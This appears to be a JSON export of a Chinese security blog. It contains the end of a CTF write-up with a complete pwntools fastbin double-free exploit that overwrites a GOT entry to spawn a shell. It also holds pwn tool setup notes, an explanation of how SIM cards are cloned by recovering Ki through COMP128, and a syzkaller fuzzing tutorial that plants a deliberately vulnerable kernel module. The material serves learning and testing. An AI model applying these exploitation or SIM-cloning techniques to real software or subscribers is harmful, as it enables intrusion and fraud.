got表中的地址需不需要满足什么条件呢？答案是必须的！main_arena把chunk从fastbin链表上卸下来的时候，会去检查该chunk中fd指向的另一chunk是否为合法chunk。合法chunk的特征是什么呢？就是目标chunk数据区之前的八个字节（64位下）必须是合法的size值，标志这个chunk的大小。Ps：其实只要这八个字节的低四字节满足就可以了。\n\n因此我们需要在上述got表中，寻找满足这种条件的地址。如下图，标记颜色的五个部分满足低四个字节为0x00000040或0x00000060，这可以是一个合法的size值。\n\n![](paper-12.png)\n\n但是选哪个作为目标地址呢，还需要结合got表项进行考虑。\n\n- 选0x602002处作为chunk的size部分\n- 选0x60201a处作为chunk的size部分\n- 选0x602032处作为chunk的size部分\n- 选0x60203a处作为chunk的size部分\n\n如果我们想覆写printf函数，即0x602040处的值，那么得使用0x602032处作为chunk的size部分。此时整个chunk的起始地址是0x60202a。可任意写的数据区从0x60203a开始。由于system函数在0x602038至0x60203f区间，因此0x60203a至0x60203f的值需要保持不变。需要将0x602040至0x602047的值改为gg函数地址。因此需要往0x60202a写入的内容为：\\x40\\x00\\x00\\x00\\x00\\x00+gg地址\n\n因为最终选择的chunk size（包含chunk头）为0x40，所以申请的堆内存大小必须是0x30。接下来可以写利用代码了。\n\n# 3、EXP\n\n```python\nfrom pwn import *\ncontext(os=\"linux\",arch=\"amd64\",log_level=\"debug\")\n\ne = ELF(\"./paper\")\nio = process(e.path)\n\ndef add_paper(index,length,content):\n    io.recv()\n    io.sendline(\"1\")\n    io.recv()\n    io.sendline(str(index))\n    io.recv()\n    io.sendline(str(length))\n    io.recv()\n    io.sendline(content)\n\ndef delete_paper(index):\n    io.recv()\n    io.sendline(\"2\")\n    io.recv()\n    io.sendline(str(index))\n    \nadd_paper(1,0x30,\"111\")\nadd_paper(2,0x30,\"222\")\n\ndelete_paper(1)\ndelete_paper(2)\ndelete_paper(1)\n\nadd_paper(3,0x30,p64(0x0060202a))\nadd_paper(4,0x30,\"444\")\nadd_paper(5,0x30,\"555\")\nadd_paper(6,0x30,\"\\x40\\x00\\x00\\x00\\x00\\x00\"+p64(e.symbols[\"gg\"]))\n\nio.recv()\nio.sendline(\"t\")\nio.interactive()\n\n```\n\n执行成功，getshell！\n\n![](paper-13.png)\n\n# 4、记录\n\n## 三类漏洞指针\n\n1、空指针：指向NULL的指针，若使用指针前未判断其是否为空，可导致程序崩溃。\n\n2、悬空指针：也称迷途指针，指向一段已释放的内存单元的指针，可导致UAF等漏洞。\n\n3、野指针：指向一段未初始化内存单元的指针。\n\n## fastbin attack\n\nhttps://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/\n\n\n## GOT表与PLT\n\nhttps://blog.csdn.net/qq_18661257/article/details/54694748\n\nhttps://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html\n\n## pwntools的使用\n\nhttps://www.cnblogs.com/Ox9A82/p/5728149.html\n\n\n\n# 5 新机搭建pwn环境\n\n由于这题必须在ubunut1804环境下利用，所以整个pwn的做题环境又需要重新搭一遍。为了以后再遇到这种情况时，可以迅速完成环境搭建，这里做一下记录。\n\n## 安装pwntools\n\n```shell\napt-get update\napt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential\npython3 -m pip install --upgrade pip\npython3 -m pip install --upgrade pwntools\n```\n\n## 安装checksec\n\n```shell\ngit clone https://github.com/slimm609/checksec.sh.git\ncd checksec.sh\nsudo cp checksec /usr/bin/checksec\n```\n\n新版使用方法：\n\n```shell\nchecksec --file=filename\n```\n\n## 安装pwndbg\n\n```shell\ngit clone https://github.com/pwndbg/pwndbg\ncd pwndbg\nsudo ./setup.sh\n```\n\n## 安装gef\n\nubuntu中下载gef.py不成功，因此跑去github直接下载源文件：\n\n[gef网址](https://github.com/hugsy/gef)\n\n```shell\n# 下载gef.py至/home/xxx用户根目录\n$ mv gef.py .gdbinit-gef.py\n$ echo \"source ~/.gdbinit-gef.py\" >> ~/.gdbinit\n```\n\n## 安装peda\n\n[peda网址](https://github.com/longld/peda)\n\n```shell\n$ git clone https://github.com/longld/peda.git ~/peda\n$ echo \"source ~/peda/peda.py\" >> ~/.gdbinit\n```\n\n## 安装ROPGadget\n\n```shell\nsudo pip install capstone\ngit clone https://github.com/JonathanSalwan/ROPgadget.git\ncd ROPgadget\nsudo python3 setup.py install\n```\n\n## 安装one_gadget\n\n```shell\n$ sudo apt -y install ruby\n$ sudo gem install one_gadget \n```\n\n## 安装LibcSearcher\n\n```shell\ngit clone https://github.com/lieanu/LibcSearcher.git\ncd LibcSearcher\nsudo python3 setup.py develop\n```\n\n## 安装32位libc\n\n方便运行32位程序，有两种方法：\n\n（1）\n\n```shell\nsudo dpkg --add-architecture i386\nsudo apt-get update\nsudo apt-get install libc6:i386\nsudo apt-get install libgtk2.0-0:i386\n```\n\n（2）\n\n```shell\n# 第一步，确认系统的架构\ndpkg --print-architecture  \n# 第二步，确认打开了多架构支持功能\npkg --print-foreign-architectures \n# 第三步，安装对应的32位库\nsudo apt-get dist-upgrade #这一步是更新所有的软件，如果你对新版本软件的需求不是那么迫切，可以不执行 \n#安装相关库  \nsudo apt-get install lib32z1 lib32ncurses5 #有的还需要32位stdc++库lib32stdc++6-4.8-dbg\n#安装gcc multilab  \nsudo apt-get install gcc-multilib g++-multilib  \n```\n\n","tags":["heap","fastbin"],"categories":["CTF"]},{"title":"SIM卡复制原理","url":"/2020/02/08/SIM/","content":"# SIM卡复制原理\n\n> GSM手机要想得到GSM系统的服务需要插入一张SIM卡。因为GSM系统是通过SIM卡来识别用户的，而不是基于手机来识别。\n>\n> 移动终端上必须装上sim卡才能使用，sim卡是整个**GSM系统**（全球移动通讯系统）中唯一确认用户身份的设备。\n\n## 常用缩写\n\nSIM，Subscriber Identification Module，客户识别模块（也称用户身份识别卡）。\n\nIMEI，国际移动设备识别码。由15位数字组成，每台手机对应一个IMEI，为全世界独一无二的。\n\nMEID，移动设备识别码。由14位十六进制字符组成。\n\nIMSI，国际移动用户识别码。通过IMSI可反查运营商、归属地、手机号码等信息。\n\n## sim卡的演进\n\n1991年，德国捷德公司开发了世界第一张SIM卡，大小是一个名片的大小。此类卡是**标准SIM卡**，也叫“原卡”。\n\n中国移动通信起步较晚，没赶上“原卡”时代，因此我们一开始接触到的是Mini SIM卡。再之后由于手机逐步小型化，2010年出现了Micro SIM卡，首先使用在苹果公司的产品上，如ipad、iphone4。2011年，苹果公司提出了更小的sim卡标准——Nano SIM卡。\n\n![](sim-4-kinds.png)\n\n以上的演进，说白了就是剪卡过程，并不是什么技术演进。\n\n但是Nano SIM卡还是占据较大的空间，在小型可穿戴设备上不实用，而且卡槽中放卡的方式不稳定。因此发展出了eSIM卡Embeded-SIM，直接嵌入到电路板上。\n\n但是eSIM仍然是一个硬件。现在还出现了依靠操作系统软件实现SIM卡功能的softSIM和vSIM，这样就完全告别实体SIM卡片了。\n\n伴随着网络变化，sim卡的变化：\n\n- SIM卡存在无法接入LTE/IMS网络的局限性\n- USIM可接入LTE/2G/3G网络，但不存储IMS网络相关的用户信息，因此接入VoLTE网络时，还需要通过终端导出IMS注册时所需要的用户码号信息。\n- ISIM卡是在USIM卡的基础上，增加了ISIM模块，专门用于存储IMS网络相关用户码号和归属地信息。可以通过读取ISIM模块中的信息直接接入VoLTE网络。\n\n## sim卡硬件特性\n\n> sim卡是一个装有微处理器的芯片卡。\n\n下面看一看实际的sim卡长什么样：\n\n![](sim-6-parts.png)\n\nsim卡通过这些铜制接口将卡内逻辑电路与移动终端连接起来。其中与移动终端连接的有如下六个触电：电源（Vcc），复位（RESET），时钟（CLK），接地端（GND），编程电压（VPP），数据I/O接口（Data）\n\nsim卡硬件内部包含如下五个模块：\n\n- 微处理器cpu，8位\n- 程序存储器ROM，3~8kbit\n- 工作存储器RAM，6~16kbit\n- 数据存储器EPROM，128~256kbit\n- 串行通信单元\n\n使用时，手机会向sim卡发送命令，sim卡根据标准规范执行后，给手机反馈执行结果。\n\n##　sim卡的功能\n\n1、存储数据：\n\n- 固定数据：这类数据在ME（Mobile Equipment）被出售之前由SIM卡中心写入，包括国际移动用户识别号（IMSI）、鉴权密钥（KI）等\n- 临时数据：指的是网络相关的的临时数据，如位置区域识别码（LAI）、移动用户暂时识别码（TMSI）、禁止接入的公共电话网代码等\n- 业务代码：如个人识别码（PIN）、解锁码（PUK）、计费费率等\n- 电话号码、短消息等用户记录\n\n（以上四类数据，除第一类只有专业部门能查阅和更新外，其他几类都是手机可查阅和更新的）\n\n2、PIN码保护\n\n3、用户身份鉴权\n\n4、SIM卡中的保密算法及密钥\n\n## sim卡认证\n\nSIM卡中没有存储本机号码，仅有IMIS号。当我们在营业厅申请并注册手机号时，运营商将手机号码与SIM卡的IMSI号、序列号以及鉴权密钥Ki做登记，储存在数据库里。\n\nSIM卡插入到手机中开机时，手机向SIM卡请求IMSI，然后把IMSI发送给运营商。运营商在数据库中查找是否存在这个IMSI并判断是否为合法用户，然后获得这个IMSI对应的手机号码和鉴权密钥Ki。\n\n运营商再生成一个随机数RAND，然后将该随机数发送给手机。手机接收到随机数RAND后，将该随机数RAND发送给SIM卡。SIM卡利用RAND和鉴权密钥Ki通过A3算法生成应答SRES，将SRES发送给手机，再由手机转发给运营商。运营商在本地利用RAND和对应的鉴权密钥Ki进行相同的运算，得到X-SRES，并比较SRES和X-SRES是否相同，相同的话就说明这个卡是合法的，允许其接入网络。\n\n上一步骤中，手机端收到RAND时，同时还会让SIM卡利用RAND和Ki计算出一个通信用的加密密钥Kc，计算时用的算法称之为A8。由于A3和A8接受的输入相同，因此实现者偷了个懒，用一个算法同时生成SRES和Kc。\n\n之后的通信过程中，使用加密密钥Kc和A5算法对通信内容进行加密。由于通信内容的加密量巨大，SIM卡无法快速处理如此多的加密需求，因此通信过程中的加密都是在手机上完成的。因此，所有的GSM手机都必须至少支持一种相同的A5算法，否则就无法漫游了。这时候运营商和设备商又偷了个懒，全世界目前都只用一种A5算法。这个算法的做法就是和Kc的8字节序列进行简单的循环XOR，再和报文序号做个减法。\n\n## sim卡复制\n\n从以上SIM卡认证原理中，我们知道IMSI和Ki是必不可少的，A3算法也必须知道。IMSI可以通过手机将其从SIM卡中读取出来，但是A3算法和鉴权密钥Ki是无法直接获取的，只能通过某种方法破解。\n\nA3算法一直被作为高级商业机密保护起来。但在1998年左右，有个人泄露了几页关于A3算法的文档到网络上。加州伯克利的几个教授拿到这个文档后，对照着SIM卡研究了一阵，最终将A3算法破解了。这个算法又叫做Comp128。\n\n怎么获取Ki呢？两个思路，一种是把SIM卡拆掉然后接到特殊设备上将Ki读取出来，另一种是利用Comp128去暴力破解、穷举。前一种方法就像用小刀在硬盘上刻操作系统一样不靠谱。后一种方法有一定的限制，SIM卡中的逻辑是一共只能查询2^16次左右，之后卡就不可用了。因此，研究者们只能在可接受的次数之内，通过构造特定明文和分析输出的密文来破解Ki的值。这种方法最终成功了。\n\n由于SIM复制设备越来越多，运营商们不得不发行新算法的卡，这个算法叫做Comp128 v2。这个算法目前为止还没被破解。\n\n\n# reference\nSIM卡实现原理：https://www.jianshu.com/p/8c9374f5e581\n\n4G LTE 网只能提供数据服务，不能承载语音通话，该怎么理解？https://www.zhihu.com/question/22365275\n\nSIM卡复制原理：https://cn.club.vmall.com/thread-2454925-1-1.html\n\n关于SIM和eSIM，看这一篇就够啦！https://zhuanlan.zhihu.com/p/47999705\n\nSIM卡中的A3、A5和A8算法：http://www.360doc.com/content/11/0913/22/3129476_148024343.shtml\n\n什么是伪基站？https://www.zhihu.com/question/36723973","categories":["通信"]},{"title":"syzkaller","url":"/2019/10/26/syzkaller/","content":"\n# 1.总览\n\n关于[Syzkaller](https://github.com/google/syzkaller)是什么，我就不多说了，介绍的文档很多。直接进入正题吧~\n\ngithub上英文版的指导中，有些许坑需要自己踩踩，所以将搭建syzkaller的环境记录下来，供之后参考。本文计划搭建如下几个环境（会不断更新）：\n\n```\n1. 使用syzkaller去fuzz x86-64架构的linux内核，这个内核是用qemu模拟的。\n2. 使用syzkaller去fuzz arm64的手机设备，qemu模拟和实体机都准备尝试一下。\n3. 两台通过网络连接的linux机器之间的fuzz。\n```\n\n在正式开始之前，先说一下基本环境。我用来搭建环境的主机是Ubuntu18.04虚拟机，gcc版本是7.5.0。\n\n```\nsyzkaller官网对gcc版本的要求是>6.1.0。所以如果你的主机是Ubuntu16.04的话，可以按照安装gcc章节升级一下本地gcc版本。\n```\n\nubuntu 18.04搭建syzkaller环境，需要做以下四件事情：\n\n- 1、准备好C编译环境。\n\n- 2、准备好待测试的Linux kernel，并开启coverage代码覆盖率选项。\n\n\n- 3、准备测试机，虚拟机或者物理机。\n\n- 4、准备好syzkaller源码，并编译。（由于syzkaller是由go语言写的，所以这里需要提前安装好go语言环境）\n\n# 2.安装GCC\n\n> gcc下载地址：[gcc下载](http://ftp.gnu.org/gnu/gcc/)\n\n宿主机自带的gcc版本过低的话，需要在原本的基础上新装一个高版本的gcc。这里我选择源码安装，并且将它安装到一个单独目录，这样今后想卸载的话，直接删除该目录即可。\n\n- 解压gcc-7.4.0源码包：`tar -zxvf gcc-7.4.0.tar.gz`（或者`tar -Jxvf gcc-7.4.0.tar.xz`）\n- 下载安装依赖项：在解压完的源码包中，执行./contrib/download_prerequisites（需更改base_url为http://mirror.linux-ia64.org/gnu/gcc/infrastructure/，如果执行时一直没有进度，考虑加上sudo权限执行）。若执行不成功，则需自行下载安装，步骤如下。\n\n```\ngcc7.4.0依赖的gmp,mpfr和mpc版本如下：\n\tgmp='gmp-6.1.0.tar.bz2'\n\tmpfr='mpfr-3.1.4.tar.bz2'\n\tmpc='mpc-1.0.3.tar.gz'\n\n安装过程参考链接：\nhttps://blog.csdn.net/lwbeyond/article/details/77718040（主要参考该文档）\nhttps://blog.csdn.net/xs1102/article/details/89175293\nhttps://blog.csdn.net/davidhopper/article/details/79681695\n\n安装gmp到configure步骤时，出现“no usable m4”错误：\nhttps://blog.csdn.net/wangqing_12345/article/details/52484723\n```\n\n# 3 x86-64 linux kernel in qemu\n\n> 标题解释：这一小节的fuzz对象是linux kernel，架构是x86-64，是使用qemu模拟出来的。\n\n## 3.1 编译syzkaller\n\n### 3.1.1 搞定go环境\n\ngo官网：[https://golang.org/dl](https://golang.org/dl/)\n\n```shell\nwget https://dl.google.com/go/go1.14.2.linux-amd64.tar.gz\ntar -xf go1.14.2.linux-amd64.tar.gz\nmv go goroot\nmkdir gopath\nexport GOPATH=`pwd`/gopath\nexport GOROOT=`pwd`/goroot\nexport PATH=$GOPATH/bin:$PATH\nexport PATH=$GOROOT/bin:$PATH\n```\n\n- goroot/ 存放go源码\n\n- gopath/ 是go的工作目录\n\n需要将它们都添加到环境变量`~/bashrc`中去，然后再`source ~/.bashrc`更新一下环境变量。\n\n### 3.1.2 下载syzkaller源码\n\n```shell\ngo get -u -d github.com/google/syzkaller/prog\n```\n\n不要小瞧这一行代码，如果不把代理配置好，咱们在国内的同学可是要下哭。关于代理的配置，之后有空再更新文章吧。\n\n### 3.1.3 编译syzkaller\n\n```shell\ncd gopath/src/github.com/google/syzkaller/\nmake\n```\n\n这里需要注意，如果是在虚拟机中编译，要把虚拟机内存给多一点，比如8G。（我一开始只给了虚拟机4G内存，结果编译不通过）\n\n编译通过后，就可以在syzkaller的bin/下看到二进制文件啦。\n\n ![](syzkaller-mgr.png)\n\n## 3.2 编译linux kernel\n\nlinux kenrel github链接：[https://github.com/torvalds/linux](https://github.com/torvalds/linux)\n\n### 3.2.1 一切顺利的情况\n\n1. 下载linux源码\n\n```shell\ngit clone git://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git\n```\n\n2. 生成配置文件\n\n```shell\ncd $kernel\nmake defconfig\nmake kvmconfig\n```\n\n3. 更改.config文件对内核的配置选项或者使用`make menuconfig`进行配置\n\n```shell\n# Coverage collection.\nCONFIG_KCOV=y\n\n# Debug info for symbolization.\nCONFIG_DEBUG_INFO=y\n\n# Memory bug detector\nCONFIG_KASAN=y\nCONFIG_KASAN_INLINE=y\n\n# Required for Debian Stretch\nCONFIG_CONFIGFS_FS=y\nCONFIG_SECURITYFS=y\n```\n\n4. 重新生成config文件\n\n```shell\nmake olddefconfig\n```\n\n5. 开始编译内核\n\n```shell\nmake -j4\n```\n\n编译完成后，可以在如下目录中看到vmlinux和bzImage文件\n\n```shell\n$ ls $KERNEL/vmlinux\n$KERNEL/vmlinux\n$ ls $KERNEL/arch/x86/boot/bzImage\n$KERNEL/arch/x86/boot/bzImage\n```\n\n### 3.2.2 若gcc版本过低\n\n最初有一次使用gcc 7.1.0编译最新版kernel时出错`“You are building kernel with non-retpoline compiler, please update your compiler..”`。查阅了一些资料显示，是由于retpoline只有gcc7.3.0及以上的版本才支持，因此需要在本地编译一个高版本gcc，并使用如下方式指定make时的编译器。以gcc8.0.1为例，编译过程如下：\n\n```shell\ncd $KERNEL\nmake CC=\" /usr/local/gcc-8.0.1/bin/gcc\" defconfig\nmake CC=\" /usr/local/gcc-8.0.1/bin/gcc\" kvmconfig\n```\n\n然后更改.config文件中的选项，使其支持我们需要的一些功能\n\n```shell\nCONFIG_KCOV=y\nCONFIG_DEBUG_INFO=y\nCONFIG_KASAN=y\nCONFIG_KASAN_INLINE=y\nCONFIG_CONFIGFS_FS=y\nCONFIG_SECURITYFS=y\n```\n\n保存完该文件后，编译\n\n```shell\nmake CC=\" /usr/local/gcc-8.0.1/bin/gcc\" oldconfig\nmake CC=\" /usr/local/gcc-8.0.1/bin/gcc\" -j4\n```\n\n编译完成后，可以看到vmlinux（kernel binary）和bzImage（packed kernel image）。\n\n![](syzkaller-vmlinux.png)\n\n## 3.3 配置qemu vm\n\n1. 安装qemu\n\n使用一条简单的命令即可：\n\n```shell\nsudo apt-get install qemu-system-x86\n```\n\n2. 生成image\n\n使用debootstrap构建linux启动镜像：\n\n```shell\nsudo apt-get install debootstrap\ncd $IMAGE/\nwget https://raw.githubusercontent.com/google/syzkaller/master/tools/create-image.sh -O create-image.sh\nchmod +x create-image.sh\n./create-image.sh\n\n# 可以使用./create-image.sh -h查看更多帮助选项\n```\n\n完成之后目录内容如下：\n\n```shell\nbling@Ubuntu1804:~/s_image$ ll\ntotal 502072\ndrwxr-xr-x  3 bling bling       4096 1月   9 09:03 ./\ndrwxr-xr-x 25 bling bling       4096 1月   9 00:45 ../\ndrwxr-xr-x 21 root  root        4096 1月   9 02:25 chroot/\n-rwxr-xr-x  1 bling bling       6360 1月   9 00:13 create-image.sh*\n-rw-------  1 bling bling       1675 1月   9 09:03 stretch.id_rsa\n-rw-r--r--  1 bling bling        398 1月   9 09:03 stretch.id_rsa.pub\n-rw-r--r--  1 bling bling 2147483648 1月   9 09:04 stretch.img\n```\n\n3. 启动虚拟机\n\n启动虚拟机试试\n\n```shell\nqemu-system-x86_64 -m 2G -smp 2 -kernel /home/bling/Downloads/linux-5.5.1/arch/x86/boot/bzImage -append \"console=ttyS0 root=/dev/sda earlyprintk=serial net.ifnames=0\" -drive file=/home/bling/s_image/stretch.img,format=raw -net user,hostfwd=tcp:127.0.0.1:10021-:22 -net nic,model=e1000 -enable-kvm -nographic -pidfile vm.pid 2>&1 | tee vm.log\n```\n\n对以上各参数我的理解如下：\n\n```\n-kernel xxx/bzImage：用bzImage作为内核镜像，qemu的这个功能用来测试不同内核非常方便。\n-append cmdline：将cmdline作为内核的命令行参数\n-hda xxx/xxx.img：指定xxx.img作为硬盘镜像\n-net user,hostfwd=tcp::10021-:22 -net nic：客户机与宿主机之间通过指定的端口进行通讯\n-enable-kvm：开启kvm虚拟化\n-nographic：非图形界面启动\n-m 2G：分配2G内存给虚拟系统\n-smp 2：指定虚拟机由2个CPU\n-pidfile xxx.pid：将qemu进程pid储存在xxx.pid这个文件中\n2>&1 | tee vm.log：将执行过程中的输出同时定向到标准输出和vm.log文件中\n```\n\n参考了两篇文章：（1）[hostfwd的问题](https://blog.csdn.net/tzwsoho/article/details/80303088) （2）[make 2>&1 | tee log.txt 命令解析](https://blog.csdn.net/Dr_Unknown/article/details/76837708)\n\nqemu启动起来之后，运行ssh测试一下是否连通，便于后期syzkaller运行出错时定位问题。\n\n```shell\nssh -i $IMAGE/stretch.id_rsa -p 10021 -o \"StrictHostKeyChecking no\" root@localhost\n```\n\n曾经有一次连接时在这里出了问题，宿主机上ssh无法连接到虚拟机。原因如下：\n\n由于上一步中create-image.sh中如下eth0跟实际qemu虚拟机中运行的网卡名称不一样，导致网卡没有分配IP地址。最后解决方法如下：qemu启动虚拟机，root用户身份登录后，设置网卡IP地址。\n\n![](syzkaller-ethnet.png)\n\n参考文章：（1）[网卡没分配IP地址的解决方法](https://blog.csdn.net/wuzhong8809/article/details/83374140)（2）[rsa公私钥知识点](https://xuanxuanblingbling.github.io/ctf/web/2019/05/10/rsa/)（3）[一个自己生成公私钥配置的方法](http://embedsec.systems/zh/gnulinux-security/2017/06/05/syzkaller.html)\n\n```shell\n# 关闭qemu虚拟机\nkill $(cat vm.pid)\n```\n\n## 3.4 启动syzkaller\n\n为了使syzkaller运行起来，在syzkaller目录下，新建一个workdir目录，并新建一个config文件用于配置运行所需参数（命名为xxx.cfg）\n\n```shell\nmkdir workdir\n./bin/syz-manager -config=abcd.cfg\n```\n\ncfg文件的格式如下，根据实际情况各参数可做更改：\n\n```\n{\n        \"target\": \"linux/amd64\",\n        \"http\": \"127.0.0.1:56741\",\n        \"workdir\": \"/home/bling/gopath/src/github.com/google/syzkaller/workdir\",\n        \"kernel_obj\": \"/home/bling/Downloads/linux-5.5.1\",\n        \"image\": \"/home/bling/s_image/stretch.img\",\n        \"sshkey\": \"/home/bling/s_image/stretch.id_rsa\",\n        \"syzkaller\": \"/home/bling/gopath/src/github.com/google/syzkaller/\",\n        \"procs\": 8,\n        \"type\": \"qemu\",\n        \"vm\": {\n                \"count\": 4,\n                \"kernel\": \"/home/bling/Downloads/linux-5.5.1/arch/x86/boot/bzImage\",\n                \"cpu\": 2,\n                \"mem\": 2048\n        }\n}\n```\n\n执行成功后，如下图所示：\n\n![](syzkaller-running.png)\n\n\n\n# 4 arm64 android kernel goldfish\n\n> 标题解释：这一小节的fuzz对象是linux kernel，架构是arm64，是使用goldfish模拟出来的。\n\n待补充...\n\n\n\n# 5 定制\n\n> 对于新的内核接口，增加系统调用描述\n\n## 5.1 syz-extract和syz-sysgen\n\nsyzkaller在编译的时候，默认不会编译syz-extract这个模块。因此我们需要手工编译一下。\n\n在syzkaller源码目录下，执行如下命令：\n\n```\nmake bin/syz-extract\n```\n\n如果syz-sysgen也没默认编译的话，执行如下命令：\n\n```\nmake bin/syz-sysgen\n```\n\n他俩的关系是这样的：\n\n```\n         +-------+            +---------+           +------+\n         |xxx.txt+----------->|xxx.const+---------->|xxx.go|\n         +---+---+            +---------+           +------+\n             |    syz-extract            syz-sysgen    ^\n             |                                         |\n             +-----------------------------------------+\n```\n\n我们针对某个驱动接口写出xxx.txt，然后使用syz-extract利用txt和源码生成const文档，最后执行syz-sysgen时syzkaller会根据txt和const生成一个go文件。可在sys/linux/gen/amd64.go和executor/syscalls.h中看到结果。\n\n## 5.2 一次定制示例\n\n- 编写一个有漏洞的驱动接口，并将其编译进内核（或者使用打ko的方式）。\n- 编写驱动接口对应的txt文件，将其放入syzkaller/sys/linux目录下，生成go文件并重新编译syzkaller。\n- 运行syzkaller，改config文件指定fuzz接口提高速率，最后分析crash。\n\n### 5.2.1 构造一个内核模块的漏洞\n\n1. 在`kernel_src/drivers/char`目录下，新建一个testxy.c。内容如下，这是一个有漏洞的内核模块。\n\n```c\n#include <linux/init.h>\n#include <linux/module.h>\n#include <linux/proc_fs.h>\n#include <linux/uaccess.h>\n#include <linux/slab.h>\n\n#define MY_DEV_NAME \"test\"\n#define DEBUG_FLAG \"PROC_DEV\"\n\nstatic ssize_t proc_read (struct file *proc_file, char __user *proc_user, size_t n, loff_t *loff);\nstatic ssize_t proc_write (struct file *proc_file, const char __user *proc_user, size_t n, loff_t *loff);\nstatic int proc_open (struct inode *proc_inode, struct file *proc_file);\nstatic struct file_operations a = {\n                                .open = proc_open,\n                                .read = proc_read,\n                                .write = proc_write,\n};\n\n\nstatic int __init mod_init(void)\n{\n    struct proc_dir_entry *test_entry;\n    const struct file_operations *proc_fops = &a;\n    printk(DEBUG_FLAG\":proc init start!\\n\");\n\n    test_entry = proc_create(MY_DEV_NAME, S_IRUGO|S_IWUGO, NULL, proc_fops);\n    if(!test_entry)\n       printk(DEBUG_FLAG\":there is somethings wrong!\\n\");\n\n    printk(DEBUG_FLAG\":proc init over!\\n\");\n    return 0;\n}\n```\n\n2. 打开char/目录下的Kconfig文件，添加：\n\n```shell\nconfig TESTXY_MODULE\n        tristate \"heap overflow test\"\n        default y\n        help\n          This file is to test a buffer overflow.\n```\n\n3. 打开char/目录下的Makefile文件，添加：\n\n```shell\nobj-$(CONFIG_TESTXY_MODULE) += testxy.o\n```\n\n若/linux/drivers/char/是新目录，还需修改/linux/drivers/Kconfig（加上source \"drivers/char/Kconfig\"）；修改/linux/drivers/Makefile（加上obj-$(CONFIG_TEST_MODULE) += char/）。\n\n4. make menuconfig时可以在`Device Drivers -> Character devices -> Heap Overflow Test` (*表示直接编如内核，M表示模块形式) 处看到刚刚添加的测试模块。\n\n```shell\nmake clean\nmake menuconfig\nmake -j8\n```\n\n5. 用新的内核启动虚拟机，查看模块是否加载成功\n\n```shell\n# 查看模块对应设备节点是否存在\nls /proc/test\n# 查看模块加载时的log信息\ndmesg | grep \"proc init\"\n```\n\n### 5.2.2 定制txt系统调用描述文件\n\n1. syzkaller源码中，找到sys/linux/目录，新建一个文件，命名为`proc_operation.txt`，内容如下：\n\n```\ninclude <linux/fs.h>\n\nopen$proc(file ptr[in, string[\"/proc/test\"]], flags flags[proc_open_flags], mode flags[proc_open_mode]) fd\nread$proc(fd fd, buf buffer[out], count len[buf]) len[buf]\nwrite$proc(fd fd, buf buffer[in], count len[buf]) len[buf]\nclose$proc(fd fd)\n\nproc_open_flags = O_RDONLY, O_WRONLY, O_RDWR, O_APPEND, FASYNC, O_CLOEXEC, O_CREAT, O_DIRECT, O_DIRECTORY, O_EXCL, O_LARGEFILE, O_NOATIME, O_NOCTTY, O_NOFOLLOW, O_NONBLOCK, O_PATH, O_SYNC, O_TRUNC, __O_TMPFILE\nproc_open_mode = S_IRUSR, S_IWUSR, S_IXUSR, S_IRGRP, S_IWGRP, S_IXGRP, S_IROTH, S_IWOTH, S_IXOTH\n\n```\n\n2. 使用syz-extract生成const文件。指定txt文件名，可单独生成该文件对应的const文件。\n\n```shell\nbin/syz-extract -os linux -sourcedir \"/home/bling/Downloads/linux-5.5.1\" -arch amd64 proc_operation.txt\n```\n\n3. 运行syz-sysgen\n4. 重新编译syzkaller\n\n```shell\nmake clean\nmake\n```\n\n### 5.2.3 验证能否成功触发crash\n\n启动syzkaller的配置文件如下。为了更快看到crash结果，增加了“enable_syscalls”项，只允许某些系统调用，效率更快。\n\n```\n{\n        \"target\": \"linux/amd64\",\n        \"http\": \"127.0.0.1:56741\",\n        \"workdir\": \"/home/bling/gopath/src/github.com/google/syzkaller/workdir\",\n        \"kernel_obj\": \"/home/bling/Downloads/linux-5.5.1\",\n        \"image\": \"/home/bling/s_image/stretch.img\",\n        \"sshkey\": \"/home/bling/s_image/stretch.id_rsa\",\n        \"syzkaller\": \"/home/bling/gopath/src/github.com/google/syzkaller/\",\n        \"procs\": 8,\n        \"type\": \"qemu\",\n        \"enable_syscalls\":[\n        \t\t\"open$proc\",\n        \t\t\"read$proc\",\n        \t\t\"write$proc\",\n        \t\t\"close$proc\"\n        ],\n        \"vm\": {\n                \"count\": 4,\n                \"kernel\": \"/home/bling/Downloads/linux-5.5.1/arch/x86/boot/bzImage\",\n                \"cpu\": 2,\n                \"mem\": 2048\n        }\n}\n```\n\n启动syzkaller进行测试：\n\n```\n./bin/syz-manager -config=abcd.cfg\n```\n\n触发到漏洞分支！\n\n![](syzkaller-display1.png)\n\n![](syzkaller-display2.png)\n\n![](syzkaller-display3.png)\n\n## 5.3 txt文件语法\n\nhttp://embedsec.systems/zh/gnulinux-security/2017/06/05/syzkaller-demo.html\n\n## 5.4 config文件\n\n[config文件示例](https://github.com/google/syzkaller/blob/master/pkg/mgrconfig/testdata/qemu.cfg)\n\n[config文件参数详解](https://github.com/google/syzkaller/blob/master/pkg/mgrconfig/config.go)\n\n# 编译ko的方法\n\ntest.c\n\n```c\n#include <linux/init.h>\n#include <linux/module.h>\n \nMODULE_LICENSE(\"Dual BSD/GPL\");\n \nstatic int hello_init(void)\n{\n        printk(KERN_ALERT \"Hello, world\\n\");\n        return 0;\n}\n \nstatic void hello_exit(void)\n{\n        printk(KERN_ALERT \"Goodbye, cruel world\\n\");\n}\n \nmodule_init(hello_init);\nmodule_exit(hello_exit);\n```\n\nMakefile\n\n```shell\nobj-m := testxy.o\n\nKDIR = /home/bling/Downloads/linux-5.5.1/\n\nall:\n        make -C $(KDIR) M=$(PWD) modules \n\nclean:\n        rm -rf *.o *.ko *.mod.* *.symvers *.order\n```\n\n\n\n# 参考文章推荐\n\n[内核漏洞挖掘技术系列(4)——syzkaller(1)](https://xz.aliyun.com/t/5079?spm=5176.12901015.0.i12901015.3af8525coJ6I6t)\n\n[【漏洞挖掘】使用Syzkaller&QEMU捕捉内核堆溢出Demo](https://www.jianshu.com/p/790b733f80a2)\n\n[Syzkaller Crash Demo](http://pwn4.fun/2019/10/09/Syzkaller-Crash-Demo/)\n\n\n\n\n\n\n\n","categories":["Fuzzing"]},{"title":"things","url":"/1994/10/23/things/","content":"\n# 20200523\n\n忙碌的一天\n\n- 8:40被电话吵醒去营业厅办宽带。\n- 10:20喊物业来家里修水池。\n- 11:00外卖到了，吃早午饭。\n- 